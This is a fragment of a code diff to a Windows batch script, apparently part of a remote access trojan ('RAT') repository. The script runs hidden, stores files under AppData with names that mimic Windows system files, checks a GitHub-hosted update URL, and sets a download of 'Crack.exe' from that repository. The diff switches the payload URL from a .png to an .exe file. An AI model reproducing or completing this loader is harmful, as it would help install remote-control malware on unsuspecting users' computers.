@@ -7,7 +7,7 @@ if not "%~1"=="HIDDEN_LAUNCH" (
 SET "APPDATA_ROOT_PATH=%USERPROFILE%\AppData"
 SET "LOCAL_FILE=%APPDATA_ROOT_PATH%\Roaming\Windows\update.txt"
 SET "UPDATE_CHECK_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/refs/heads/main/UpdateChecks"
-SET "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
+SET "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
 SET "PROCESS_TO_KILL_NAME=WinSystem32.exe"
 SET "TARGET_FILE=%APPDATA_ROOT_PATH%\Crack.exe"
 :CheckInternet
